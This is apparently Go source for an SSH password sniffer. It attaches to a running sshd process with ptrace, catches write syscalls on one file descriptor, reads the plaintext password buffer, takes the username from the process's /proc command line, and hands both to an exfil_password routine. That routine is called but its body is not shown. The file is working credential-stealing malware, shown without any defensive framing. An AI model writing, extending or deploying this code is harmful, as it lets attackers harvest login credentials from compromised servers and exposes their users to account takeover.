package main

import (
	"fmt"
	"io/ioutil"
	"regexp"
	"syscall"
)

func traceSSHDProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
	}()

	var wstatus syscall.WaitStatus
	for {

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			var regs syscall.PtraceRegs
			err := syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				syscall.PtraceDetach(pid)
				return
			}
			// Find some way to only find it once
			if regs.Rdi == 5 && regs.Orig_rax == 1 {
				buffer := make([]byte, regs.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
				if err != nil {
					return
				}
				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
					username := "root"
					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
					matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
					if len(matches) == 2 {
						username = string(matches[1])
					}
					var password = string(buffer)
					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
					if !valid {
						go exfil_password(username, removeFirstFourBytes(password))
					}
				}
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}

func removeFirstFourBytes(input string) string {
	if len(input) < 4 {
		return ""
	}
	return input[4:]
}
